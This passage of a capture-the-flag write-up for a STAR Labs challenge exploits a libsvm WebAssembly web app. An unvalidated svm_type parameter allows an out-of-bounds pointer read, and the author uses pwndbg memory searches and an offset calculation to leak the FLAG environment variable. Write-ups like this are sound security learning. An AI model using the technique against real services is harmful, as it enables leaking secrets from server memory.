+`svm.init(){:js}` doesn't seem too suspicious and doesn't pass our user input
+in, so we'll skip that. 
+
+```js title="src/index.ts"
+public feedSamples = (data: Array<Array<number>>, labels: Array<number>) => {
+    this.checkInitialization()
+    if (this.samplesPointer == null) libsvm._free_sample(this.samplesPointer);
+
+    const encodeData = new Float64Array(data.reduce((prev, curr) => prev.concat(curr), []));
+    
+    const dataPtr = libsvm._malloc(encodeData.length * 8);
+    libsvm.HEAPF64.set(encodeData, dataPtr/8);
+    
+    const encodeLabelData = new Float64Array(labels);
+    const labelPtr = libsvm._malloc(encodeLabelData.length * 8);
+    libsvm.HEAPF64.set(encodeLabelData, labelPtr/8);
+    
+    this.samplesPointer = libsvm._make_samples(dataPtr, labelPtr, data.length, data[0].length);
+}
+```
+
+`svm.feedSamples(data, labels){:js}` calls `libsvm._make_samples{:js}`, passing
+our data and label arrays to it.
+
+```c title="libsvm-wasm.c"
+EMSCRIPTEN_KEEPALIVE
+svm_problem *make_samples(double *data, double *labels, int nb_feat, int nb_dim)
+{
+    svm_problem *samples = make_samples_internal(nb_feat, nb_dim);
+    for (int i = 0; i < nb_feat; i++)
+    {
+        for (int j = 0; j < nb_dim; j++)
+        {
+            samples->x[i][j].index = j + 1;
+            samples->x[i][j].value = data[i * nb_dim + j];
+        }
+        samples->x[i][nb_dim].index = -1;
+        samples->y[i] = labels[i];
+    }
+    return samples;
+}
+
+svm_problem *make_samples_internal(int nb_feat, int nb_dim)
+{
+    svm_problem *sample = MALLOC(svm_problem, 1);
+    sample->l = nb_feat;
+    sample->y = MALLOC(double, nb_feat);
+    sample->x = MALLOC(svm_node *, nb_feat);
+    svm_node *space = MALLOC(svm_node, nb_feat * (nb_dim + 1));
+    for (int i = 0; i < nb_feat; i++)
+    {
+        sample->x[i] = space + i * (nb_dim + 1);
+    }
+    return sample;
+}
+```
+
+```js title="src/index.ts"
+public train = async () => {
+    this.checkInitialization()
+    if (this.paramPointer == -1) {
+        await this.feedParam();
+    }
+    if (this.paramPointer == -1 || this.samplesPointer == -1) return;
+    if (this.modelPointer != -1) libsvm._free_model(this.modelPointer);
+    this.modelPointer = libsvm._train_model(this.samplesPointer, this.paramPointer);
+}
+```
+
+`svm.train(){:js}` calls `libsvm._train_model{:js}`, with a pointer to the
+sample array generated earlier, as well as the param array.
+
+```c title="libsvm-wasm.c"
+EMSCRIPTEN_KEEPALIVE
+svm_model *train_model(svm_problem *samples, svm_parameter *param)
+{
+    svm_model *model = svm_train(samples, param);
+    svm_destroy_param(param);
+    return model;
+}
+```
+
+`svm_train(samples, param){:c}` is our entrypoint into the actual libsvm
+implementation, so let's go check libsvm out!
+
+### libsvm
+
+The codebase for libsvm is quite huge, so instead of reading the code, let's
+read the README first.
+
+We see this scary-looking warning in the README:
+
+```text title="README"
+*NOTE* Because svm_model contains pointers to svm_problem, you can
+not free the memory used by svm_problem if you are still using the
+svm_model produced by svm_train().
+
+*NOTE* To avoid wrong parameters, svm_check_parameter() should be
+called before svm_train().
+```
+
+Hmm, `svm_check_parameter(){:c}` looks new... I don't remember seeing it
+anywhere in the libsvm-wasm codebase...
+
+Ok, if the wasm didn't do the checking, maybe our web app did, so let's
+quickly check what kind of values it accepts for data, labels and params.
+
+### Web app
+
+These are the checks done on our input:
+
+```js title="index.js"
+function validateTrainingPayload(body: any): string | null {
+  const { data, labels, params } = body;
+
+  if (!data || !labels || !params) return 'Missing data, labels, or params.';
+  if (!Array.isArray(labels) || !labels.every(item => typeof item === 'number')) return 'Invalid format: labels must be an array of numbers.';
+  if (!Array.isArray(data) || data.length === 0) return 'Invalid format: data must be a non-empty array of arrays.';
+  for (const row of data) {
+    if (!Array.isArray(row) || !row.every(item => typeof item === 'number')) return 'Invalid format: each item in data must be an array of numbers.';
+  }
+  if (data.length !== labels.length) return 'Inconsistent data: number of samples must match number of labels.';
+
+  if (typeof params !== 'object' || params === null) {
+      return 'Invalid format: params must be an object.';
+  }
+  const numberParams = new Set(['svm_type', 'kernel_type', 'degree', 'gamma', 'coef0', 'cache_size', 'C', 'nr_weight', 'nu', 'p', 'shrinking', 'probability']);
+  const arrayParams = new Set(['weight_label', 'weight']);
+
+  for (const key in params) {
+    const value = params[key];
+    if (!numberParams.has(key) && !arrayParams.has(key)) {
+      return `Invalid param: '${key}' is not a recognized SVM parameter.`;
+    }
+    if (numberParams.has(key) && typeof value !== 'number') {
+      return `Type error: parameter '${key}' must be a number.`;
+    }
+    if (arrayParams.has(key) && (!Array.isArray(value) || !value.every(item => typeof item === 'number'))) {
+      return `Type error: parameter '${key}' must be an array of numbers.`;
+    }
+  }
+
+  return null;
+}
+```
+
+data must be an array of number arrays, labels must be an array of numbers, and
+params must be an object that maps the subset of parameters exposed to us in
+`numberParams{:js}` and `arrayParams{:js}` to either numeric values or numeric
+arrays. Our target is params so let's focus on that.
+
+Comparing the checks done here with `svm_check_parameter(){:c}` (which can be
+found
+[here](https://github.com/cjlin1/libsvm/blob/65367d015d9e368cc79f5c56924455c3a4fb5e48/svm.cpp#L3178)),
+we can see that `svm_check_parameter(){:c}` is definitely more strict. A simple
+one is this:
+
+```c title="svm.cpp"
+const char *svm_check_parameter(const svm_problem *prob, const svm_parameter *param)
+{
+  // ...
+	int svm_type = param->svm_type;
+	if(svm_type != C_SVC &&
+	   svm_type != NU_SVC &&
+	   svm_type != ONE_CLASS &&
+	   svm_type != EPSILON_SVR &&
+	   svm_type != NU_SVR)
+		return "unknown svm type";
+  // ...
+}
+```
+
+For the `svm_type` parameter, our web app merely checks if it's a number, while
+`svm_check_parameter(){:c}` checks its value as well. Let's try putting an
+invalid value for type, such as -1:
+
+```
+HTTP/1.1 200 OK
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="1e723f8fd9581b6eef29fe47282cdb8c.svm"
+Content-Length: 110
+Date: Wed, 10 Sep 2025 23:34:28 GMT
+Connection: close
+
+svm_type (null)
+kernel_type rbf
+gamma 0.074074074625968933
+nr_class 2
+total_sv 0
+rho 0
+label 1 2
+nr_sv 0 0
+SV
+```
+
+Nice! The `svm_type` output is (null), which indicates some printf operation
+going on here. It seems we have an oob read in the wasm memory!
+
+Also, the web app crashes with certain indexes like 89. This tells us that the
+`svm_type` array is an array of char pointers, and the printf grabs this pointer
+from the specified index, and attempts to dereference it, and it happens that
+there is no valid pointer to dereference at index 89.
+
+## Exploit
+
+Our goal, as mentioned above, is to read the flag. A quick check with chatgpt
+tells us that this code here:
+
+```js title="pre.js"
+var Module = {
+  preRun: [function() {
+    ENV.FLAG = process.env.FLAG || 'default_flag';
+  }]
+};
+```
+
+loads `process.env.FLAG{:js}` to a variable `os.environ{:c}` in the wasm's
+linear memory. If we know the offset between our `svm_type` array and this
+`os.environ` array, we can supply that offset as the `svm_type` parameter to
+read the flag. But how can we calculate this offset?
+
+To debug the wasm module in gdb, I wrote a small initialization script:
+
+```js title="index.mjs"
+import { SVM } from './libsvm-wasm/src/index.js';
+const a = new SVM()
+var b = await a.init()
+console.log(await a.train([0xcafebabe]))
+while (1) {
+}
+```
+
+and attached node to gdb, running the script with `r index.mjs`.
+
+Let's first look for our `svm_type` array.
+
+```ansi
+[1m[32mpwndbg> [0msearch -t string c_svc
+Searching for string: b'c_svc\x00'
+[35m[anon_7ffb3e7f0][39m [35m0x7ffb3e7f09e2[39m 0x6166006376735f63 /* 'c_svc' */
+[35m[anon_7ffff7ac6][39m [35m0x7ffff7aec3f2[39m 0x6166006376735f63 /* 'c_svc' */
+```
+
+Since the array is an array of char pointers, we need to find the char pointer
+to this c_svc string. In wasm, pointers are simply offsets from the base of the
+wasm memory, so 0x7ffb3e7f09e2 above would be stored as 0x9e2 in memory, since
+the base of the memory region is 0x7ffb3e7f0000.
+
+```ansi
+[1m[32mpwndbg> [0msearch -4 0x9e2 anon_7ffb3e7f0
+Searching for a 4-byte integer: b'\xe2\t\x00\x00'
+[35m[anon_7ffb3e7f0][39m [35m0x7ffb3e7f58e0[39m 0x9db000009e2
+```
+
+So the `svm_type` array is at +0x58e0 in memory. Now let's look for our flag.
+
+```ansi
+[1m[32mpwndbg> [0msearch -t string default_flag
+Searching for string: b'default_flag\x00'
+[35m[anon_257f56b00][39m [35m0x257f56b2dd4d[39m 'default_flag'
+[35m[anon_39efca180][39m [35m0x39efca19a9a8[39m 'default_flag'
+[35m[anon_3a8982780][39m [35m0x3a89827bd5e5[39m 'default_flag'
+[35m[anon_7ffb3e7f0][39m [35m0x7ffb3e80661d[39m 'default_flag'
+
+[1m[32mpwndbg> [0mx/s 0x7ffb3e80661d-0x5
+[34m0x7ffb3e806618[39m: "FLAG=default_flag"
+```
+
+Similarly, `os.environ` is an array of char pointers, so we look for the pointer
+to the flag starting at "FLAG=", which is 0x16618.
+
+```ansi
+[1m[32mpwndbg> [0msearch -4 0x16618 anon_7ffb3e7f0
+Searching for a 4-byte integer: b'\x18f\x01\x00'
+[35m[anon_7ffb3e7f0][39m [35m0x7ffb3e806574[39m 0x16618
+```
+
+So the offset from `svm_type` array to the flag pointer is `(0x16574 - 0x58e0) /
+4 = 17189`. Setting that as the `svm_type` parameter gives us the flag!
+
+```
+svm_type FLAG=flag{a7866720ad35a8814ad482249c6d7be63a36e3c1fda47d90a85381494aa5edf3}
+kernel_type rbf
+gamma 0.074074074625968933
+nr_class 2
+total_sv 0
+rho 0
+label 1 2
+nr_sv 0 0
+SV
+```
+
+---
+
+This set of challenges by STAR Labs was really educational, and was a great
+opportunity for me to think deeply about the technical parts behind some
+concepts that I thought I was already familiar with, without the super tight
+time pressure of CTFs. Thanks to all the challenge creators behind this
+challenge!
